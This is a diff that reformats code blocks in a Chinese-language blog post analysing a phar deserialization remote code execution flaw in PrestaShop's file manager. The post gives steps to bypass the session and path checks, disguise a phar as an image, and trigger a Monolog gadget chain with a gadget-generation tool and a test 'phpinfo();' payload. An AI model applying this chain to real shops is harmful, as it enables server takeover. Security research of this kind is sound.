@@ -67,43 +67,37 @@
 
 &lt;p&gt;在&lt;code&gt;dialog.php&lt;/code&gt;开头设置了一个&lt;code&gt;verify&lt;/code&gt;字段&lt;/p&gt;
 
-&lt;p&gt;​&lt;code&gt;php
-$_SESSION[&amp;quot;verify&amp;quot;] = &amp;quot;RESPONSIVEfilemanager&amp;quot;;
-​&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$_SESSION[&amp;quot;verify&amp;quot;] = &amp;quot;RESPONSIVEfilemanager&amp;quot;;
+&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;而在页面检查了这个字段的值，所以无法直接访问&lt;code&gt;ajax_calls.php&lt;/code&gt;页面，必须先访问&lt;code&gt;dialog.php&lt;/code&gt;，目的应该是为了保证文件操作都是从&lt;code&gt;dialog.php&lt;/code&gt;页面进行的吧&lt;/p&gt;
 
-&lt;p&gt;​&lt;code&gt;php
-if ($_SESSION[&#39;verify&#39;] != &#39;RESPONSIVEfilemanager&#39;) {
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;if ($_SESSION[&#39;verify&#39;] != &#39;RESPONSIVEfilemanager&#39;) {
     die(&#39;Forbidden&#39;);
 }
-​&lt;/code&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;然后我们就可以上传一个&lt;code&gt;phar&lt;/code&gt;文件，当然系统限制文件后缀只能在白名单内&lt;code&gt;&#39;jpg&#39;, &#39;jpeg&#39;, &#39;png&#39;, &#39;gif&#39;, &#39;bmp&#39;, &#39;tiff&#39;, &#39;svg&#39;, &#39;pdf&#39;, &#39;mov&#39;, &#39;mpeg&#39;, &#39;mp4&#39;, &#39;avi&#39;, &#39;mpg&#39;, &#39;wma&#39;, &#39;flv&#39;, &#39;webm&#39;&lt;/code&gt;，所以需要将&lt;code&gt;phar&lt;/code&gt;文件重命名符合要求的后缀。由于在&lt;code&gt;phar://&lt;/code&gt;解析时只要满足&lt;code&gt;phar&lt;/code&gt;文件标识，即文件头必须以&lt;code&gt;__HALT_COMPILER();?&amp;gt;&lt;/code&gt;结尾，所以并不限制文件后缀。此处也有一个技巧，我们可以创建一个合法的&lt;code&gt;jpeg&lt;/code&gt;文件，同时又是一个&lt;code&gt;phar&lt;/code&gt;文件，这个文件甚至可以绕过&lt;code&gt;MIME&lt;/code&gt;检查，关于这个技巧可以参考&lt;a href=&#34;https://www.nc-lp.com/blog/disguise-phar-packages-as-images&#34;&gt;这里&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;接下来具体看&lt;code&gt;image_size&lt;/code&gt;分支&lt;/p&gt;
 
-&lt;p&gt;​```php
-case &amp;lsquo;image_size&amp;rsquo;:
-    if (realpath(dirname(_PS_ROOT&lt;em&gt;DIR&lt;/em&gt;.$_POST[&amp;lsquo;path&amp;rsquo;])) != realpath(_PS_ROOT&lt;em&gt;DIR&lt;/em&gt;.$upload_dir)) {
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;case &#39;image_size&#39;:
+    if (realpath(dirname(_PS_ROOT_DIR_.$_POST[&#39;path&#39;])) != realpath(_PS_ROOT_DIR_.$upload_dir)) {
         die();
     }
-    $pos = strpos($_POST[&amp;lsquo;path&amp;rsquo;], $upload_dir);
+    $pos = strpos($_POST[&#39;path&#39;], $upload_dir);
     if ($pos !== false) {
-        $info = getimagesize(substr_replace($_POST[&amp;lsquo;path&amp;rsquo;], $current_path, $pos, strlen($upload_dir)));
+        $info = getimagesize(substr_replace($_POST[&#39;path&#39;], $current_path, $pos, strlen($upload_dir)));
         echo json_encode($info);
-    }&lt;/p&gt;
+    }
 
-&lt;pre&gt;&lt;code&gt;break;
+    break;
 &lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;​```&lt;/p&gt;
 
 &lt;p&gt;第一个&lt;code&gt;if&lt;/code&gt;条件，检查&lt;code&gt;path&lt;/code&gt;参数的绝对路径是否和系统定义的&lt;code&gt;upload_dir&lt;/code&gt;绝对路径相等，&lt;code&gt;upload_dir&lt;/code&gt;的值是&lt;/p&gt;
 
-&lt;p&gt;​&lt;code&gt;php
-$upload_dir = Context::getContext()-&amp;gt;shop-&amp;gt;getBaseURI().&#39;img/cms/&#39;; // path from base_url to base of upload folder (with start and final /)
-​&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$upload_dir = Context::getContext()-&amp;gt;shop-&amp;gt;getBaseURI().&#39;img/cms/&#39;; // path from base_url to base of upload folder (with start and final /)
+&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;而我们要&lt;code&gt;post&lt;/code&gt;的&lt;code&gt;path&lt;/code&gt;参数是这个样子&lt;code&gt;phar://path/phar.jpg&lt;/code&gt;，显然无法通过判断。这时候考虑一下，假如我们把默认上传路径修改了，比如改成&lt;code&gt;img/test/&lt;/code&gt;，那么系统就会找不到&lt;code&gt;img/cms/&lt;/code&gt;这个路径，&lt;code&gt;realpath&lt;/code&gt;返回结果为&lt;code&gt;false&lt;/code&gt;，那么就可以绕过这个条件。&lt;/p&gt;
 
@@ -113,9 +107,8 @@ $upload_dir = Context::getContext()-&amp;gt;shop-&amp;gt;getBaseURI().&#39;img/c
 
 &lt;p&gt;接下来看第2个条件&lt;/p&gt;
 
-&lt;p&gt;​&lt;code&gt;php
-$pos = strpos($_POST[&#39;path&#39;], $upload_dir);
-​&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$pos = strpos($_POST[&#39;path&#39;], $upload_dir);
+&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;此处只要让&lt;code&gt;path&lt;/code&gt;参数包含&lt;code&gt;img/cms/&lt;/code&gt;字符串即可，这样经过后面的替换和拼接，&lt;code&gt;path&lt;/code&gt;就类似于&lt;code&gt;phar://img/test/phar.pdf/var/www/html/img/cms/&lt;/code&gt;，不影响&lt;code&gt;phar&lt;/code&gt;解析&lt;/p&gt;
 
@@ -123,17 +116,16 @@ $pos = strpos($_POST[&#39;path&#39;], $upload_dir);
 
 &lt;p&gt;在&lt;code&gt;PrestaShop&lt;/code&gt;项目中存在&lt;code&gt;Monolog&lt;/code&gt;，这是&lt;code&gt;php&lt;/code&gt;下一个日志记录类库， 在这个库中的&lt;code&gt;BufferHandler&lt;/code&gt;类的&lt;code&gt;handle&lt;/code&gt;函数有一段存在风险的代码&lt;/p&gt;
 
-&lt;p&gt;​&lt;code&gt;php
-public function handle(array $record){
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;public function handle(array $record){
     //...
-    if ($this-&amp;gt;processors) {
-        foreach ($this-&amp;gt;processors as $processor) {
-            $record = call_user_func($processor, $record);
-        }
-    }
+	if ($this-&amp;gt;processors) {
+    	foreach ($this-&amp;gt;processors as $processor) {
+        	$record = call_user_func($processor, $record);
+    	}
+	}
     //...
 }
-​&lt;/code&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;如果&lt;code&gt;$this-&amp;gt;processors&lt;/code&gt;和&lt;code&gt;$record&lt;/code&gt;均可控的话，就可以造成一个命令执行，所以我们可以序列化这个类构造&lt;code&gt;POP&lt;/code&gt;链&lt;/p&gt;
 
@@ -143,22 +135,20 @@ public function handle(array $record){
 
 &lt;p&gt;我们利用之前介绍过的&lt;a href=&#34;https://github.com/s-n-t/phpggc&#34;&gt;PHARGCC&lt;/a&gt;工具生成一个包含&lt;code&gt;POP&lt;/code&gt;链的&lt;code&gt;phar&lt;/code&gt;文件，选择&lt;code&gt;Monolog/RCE1&lt;/code&gt;，看一下这个&lt;code&gt;gadget&lt;/code&gt;的使用&lt;/p&gt;
 
-&lt;p&gt;​```shell
-&amp;gt; pharggc -i Monolog/RCE1
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;&amp;gt; pharggc -i Monolog/RCE1
 Name           : Monolog/RCE1
 Version        : 1.18 &amp;lt;= 1.23
 Type           :
-Vector         : __destruct&lt;/p&gt;
+Vector         : __destruct
 
-&lt;p&gt;./pharggc Monolog/RCE1 &lt;code&gt;
-​```&lt;/p&gt;
+./pharggc Monolog/RCE1 &amp;lt;code&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;生成一个&lt;code&gt;out.phar&lt;/code&gt;，并重命名成&lt;code&gt;out.png&lt;/code&gt;&lt;/p&gt;
 
-&lt;p&gt;​&lt;code&gt;shell
-&amp;gt; pharggc Monolog/RCE1 &amp;quot;phpinfo();&amp;quot;
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;&amp;gt; pharggc Monolog/RCE1 &amp;quot;phpinfo();&amp;quot;
 Payload written to: out.phar
-​&lt;/code&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;然后通过&lt;code&gt;http://host/admin-rename/filemanager/dialog.php&lt;/code&gt;上传到服务器上&lt;/p&gt;
 
